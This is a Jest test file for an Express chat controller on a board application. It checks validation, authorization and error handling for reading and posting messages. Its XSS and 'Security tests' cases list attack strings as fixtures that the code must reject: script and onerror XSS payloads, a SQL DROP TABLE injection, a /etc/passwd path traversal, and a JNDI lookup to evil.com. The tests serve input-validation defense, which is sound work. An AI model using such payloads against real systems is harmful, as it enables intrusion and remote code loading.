import { Request, Response, NextFunction } from 'express';
import { z } from 'zod';
import * as chatController from '../../api/chat/chat.controller';
import * as chatService from '../../api/chat/chat.service';
import {
  createMockRequest,
  createMockResponse,
  createMockNext,
} from '../utils/test-helpers';

// Mock chat service
jest.mock('../../api/chat/chat.service');
const mockChatService = chatService as jest.Mocked<typeof chatService>;

describe('Chat Controller', () => {
  let mockReq: Partial<Request>;
  let mockRes: Partial<Response>;
  let mockNext: NextFunction;

  beforeEach(() => {
    jest.clearAllMocks();
    mockReq = createMockRequest();
    mockRes = createMockResponse();
    mockNext = createMockNext();
  });

  describe('getChatMessages', () => {
    const validRequestData = {
      params: { boardId: '123e4567-e89b-12d3-a456-426614174000' },
      userId: 'user-123',
    };

    it('retrieves chat messages successfully', async () => {
      mockReq = createMockRequest(validRequestData);

      const mockMessages = [
        {
          id: 'msg-1',
          message: 'First message',
          createdAt: new Date(),
          boardId: 'board-123',
          userId: 'user-123',
          user: {
            id: 'user-123',
            name: 'Test User',
            email: 'test@example.com',
          },
        },
      ];

      mockChatService.getBoardChatMessages.mockResolvedValue(mockMessages);

      await chatController.getChatMessages(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockChatService.getBoardChatMessages).toHaveBeenCalledWith(
        '123e4567-e89b-12d3-a456-426614174000',
        'user-123'
      );

      expect(mockRes.status).toHaveBeenCalledWith(200);
      expect(mockRes.json).toHaveBeenCalledWith(mockMessages);
    });

    it('handles validation errors for invalid board ID', async () => {
      mockReq = createMockRequest({
        params: { boardId: 'invalid-uuid' },
        userId: 'user-123',
      });

      await chatController.getChatMessages(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockRes.status).toHaveBeenCalledWith(400);
      expect(mockRes.json).toHaveBeenCalledWith({
        message: 'Validation error',
        errors: expect.any(Array),
      });

      expect(mockChatService.getBoardChatMessages).not.toHaveBeenCalled();
    });

    it('handles unauthorized requests', async () => {
      mockReq = createMockRequest({
        params: { boardId: '123e4567-e89b-12d3-a456-426614174000' },
        userId: null,
      });

      await chatController.getChatMessages(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockRes.status).toHaveBeenCalledWith(401);
      expect(mockRes.json).toHaveBeenCalledWith({ message: 'Unauthorized' });
    });

    it('handles service errors with status codes', async () => {
      mockReq = createMockRequest(validRequestData);

      const serviceError = new Error('Board não encontrado.') as Error & {
        statusCode: number;
      };
      serviceError.statusCode = 404;

      mockChatService.getBoardChatMessages.mockRejectedValue(serviceError);

      await chatController.getChatMessages(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockRes.status).toHaveBeenCalledWith(404);
      expect(mockRes.json).toHaveBeenCalledWith({
        message: 'Board não encontrado.',
      });
    });

    it('handles permission denied errors', async () => {
      mockReq = createMockRequest(validRequestData);

      const permissionError = new Error(
        'Você não tem permissão para acessar o chat deste board.'
      ) as Error & { statusCode: number };
      permissionError.statusCode = 403;

      mockChatService.getBoardChatMessages.mockRejectedValue(permissionError);

      await chatController.getChatMessages(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockRes.status).toHaveBeenCalledWith(403);
      expect(mockRes.json).toHaveBeenCalledWith({
        message: 'Você não tem permissão para acessar o chat deste board.',
      });
    });

    it('passes unknown errors to next middleware', async () => {
      mockReq = createMockRequest(validRequestData);

      const unknownError = new Error('Unknown database error');
      mockChatService.getBoardChatMessages.mockRejectedValue(unknownError);

      await chatController.getChatMessages(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockNext).toHaveBeenCalledWith(unknownError);
    });
  });

  describe('sendChatMessage', () => {
    const validRequestData = {
      params: { boardId: '123e4567-e89b-12d3-a456-426614174000' },
      body: { message: 'Test message' },
      userId: 'user-123',
    };

    it('sends chat message successfully', async () => {
      mockReq = createMockRequest(validRequestData);

      const mockCreatedMessage = {
        id: 'msg-123',
        message: 'Test message',
        createdAt: new Date(),
        boardId: 'board-123',
        userId: 'user-123',
        user: {
          id: 'user-123',
          name: 'Test User',
          email: 'test@example.com',
        },
      };

      mockChatService.createChatMessage.mockResolvedValue(mockCreatedMessage);

      await chatController.sendChatMessage(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockChatService.createChatMessage).toHaveBeenCalledWith(
        '123e4567-e89b-12d3-a456-426614174000',
        'Test message',
        'user-123'
      );

      expect(mockRes.status).toHaveBeenCalledWith(201);
      expect(mockRes.json).toHaveBeenCalledWith(mockCreatedMessage);
    });

    it('validates message content', async () => {
      mockReq = createMockRequest({
        ...validRequestData,
        body: { message: '' }, // Empty message
      });

      await chatController.sendChatMessage(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockRes.status).toHaveBeenCalledWith(400);
      expect(mockRes.json).toHaveBeenCalledWith({
        message: 'Validation error',
        errors: expect.any(Array),
      });

      expect(mockChatService.createChatMessage).not.toHaveBeenCalled();
    });

    it('validates message length', async () => {
      mockReq = createMockRequest({
        ...validRequestData,
        body: { message: 'a'.repeat(1001) }, // Too long message
      });

      await chatController.sendChatMessage(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockRes.status).toHaveBeenCalledWith(400);
      expect(mockRes.json).toHaveBeenCalledWith({
        message: 'Validation error',
        errors: expect.any(Array),
      });

      expect(mockChatService.createChatMessage).not.toHaveBeenCalled();
    });

    it('rejects XSS attempts in messages', async () => {
      const xssAttempts = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        'javascript:alert("xss")',
      ];

      for (const xssMessage of xssAttempts) {
        mockReq = createMockRequest({
          ...validRequestData,
          body: { message: xssMessage },
        });

        await chatController.sendChatMessage(
          mockReq as Request,
          mockRes as Response,
          mockNext
        );

        expect(mockRes.status).toHaveBeenCalledWith(400);
        expect(mockRes.json).toHaveBeenCalledWith({
          message: 'Validation error',
          errors: expect.any(Array),
        });

        expect(mockChatService.createChatMessage).not.toHaveBeenCalled();
      }
    });

    it('handles unauthorized requests', async () => {
      mockReq = createMockRequest({
        ...validRequestData,
        userId: null,
      });

      await chatController.sendChatMessage(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockRes.status).toHaveBeenCalledWith(401);
      expect(mockRes.json).toHaveBeenCalledWith({ message: 'Unauthorized' });
    });

    it('handles invalid board ID', async () => {
      mockReq = createMockRequest({
        ...validRequestData,
        params: { boardId: 'invalid-uuid' },
      });

      await chatController.sendChatMessage(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockRes.status).toHaveBeenCalledWith(400);
      expect(mockRes.json).toHaveBeenCalledWith({
        message: 'Validation error',
        errors: expect.any(Array),
      });

      expect(mockChatService.createChatMessage).not.toHaveBeenCalled();
    });

    it('handles service errors with status codes', async () => {
      mockReq = createMockRequest(validRequestData);

      const serviceError = new Error('Board não encontrado.') as Error & {
        statusCode: number;
      };
      serviceError.statusCode = 404;

      mockChatService.createChatMessage.mockRejectedValue(serviceError);

      await chatController.sendChatMessage(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockRes.status).toHaveBeenCalledWith(404);
      expect(mockRes.json).toHaveBeenCalledWith({
        message: 'Board não encontrado.',
      });
    });

    it('handles permission denied errors', async () => {
      mockReq = createMockRequest(validRequestData);

      const permissionError = new Error(
        'Você não tem permissão para enviar mensagens neste board.'
      ) as Error & { statusCode: number };
      permissionError.statusCode = 403;

      mockChatService.createChatMessage.mockRejectedValue(permissionError);

      await chatController.sendChatMessage(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockRes.status).toHaveBeenCalledWith(403);
      expect(mockRes.json).toHaveBeenCalledWith({
        message: 'Você não tem permissão para enviar mensagens neste board.',
      });
    });

    it('passes unknown errors to next middleware', async () => {
      mockReq = createMockRequest(validRequestData);

      const unknownError = new Error('Unknown database error');
      mockChatService.createChatMessage.mockRejectedValue(unknownError);

      await chatController.sendChatMessage(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockNext).toHaveBeenCalledWith(unknownError);
    });

    it('trims whitespace from messages', async () => {
      mockReq = createMockRequest({
        ...validRequestData,
        body: { message: '  Test message with spaces  ' },
      });

      const mockCreatedMessage = {
        id: 'msg-123',
        message: 'Test message with spaces',
        createdAt: new Date(),
        boardId: 'board-123',
        userId: 'user-123',
        user: {
          id: 'user-123',
          name: 'Test User',
          email: 'test@example.com',
        },
      };

      mockChatService.createChatMessage.mockResolvedValue(mockCreatedMessage);

      await chatController.sendChatMessage(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockChatService.createChatMessage).toHaveBeenCalledWith(
        '123e4567-e89b-12d3-a456-426614174000',
        'Test message with spaces',
        'user-123'
      );
    });
  });

  describe('Security tests', () => {
    it('prevents injection attacks in board ID', async () => {
      const maliciousBoardIds = [
        "'; DROP TABLE boards; --",
        '<script>alert("xss")</script>',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
      ];

      for (const maliciousId of maliciousBoardIds) {
        mockReq = createMockRequest({
          params: { boardId: maliciousId },
          userId: 'user-123',
        });

        await chatController.getChatMessages(
          mockReq as Request,
          mockRes as Response,
          mockNext
        );

        expect(mockRes.status).toHaveBeenCalledWith(400);
        expect(mockRes.json).toHaveBeenCalledWith({
          message: 'Validation error',
          errors: expect.any(Array),
        });

        expect(mockChatService.getBoardChatMessages).not.toHaveBeenCalled();
      }
    });

    it('validates all required fields', async () => {
      // Test missing board ID
      mockReq = createMockRequest({
        params: {},
        userId: 'user-123',
      });

      await chatController.getChatMessages(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockRes.status).toHaveBeenCalledWith(400);
      expect(mockRes.json).toHaveBeenCalledWith({
        message: 'Validation error',
        errors: expect.any(Array),
      });
    });

    it('handles malformed request bodies', async () => {
      mockReq = createMockRequest({
        params: { boardId: '123e4567-e89b-12d3-a456-426614174000' },
        body: null,
        userId: 'user-123',
      });

      await chatController.sendChatMessage(
        mockReq as Request,
        mockRes as Response,
        mockNext
      );

      expect(mockRes.status).toHaveBeenCalledWith(400);
      expect(mockRes.json).toHaveBeenCalledWith({
        message: 'Validation error',
        errors: expect.any(Array),
      });
    });
  });
});
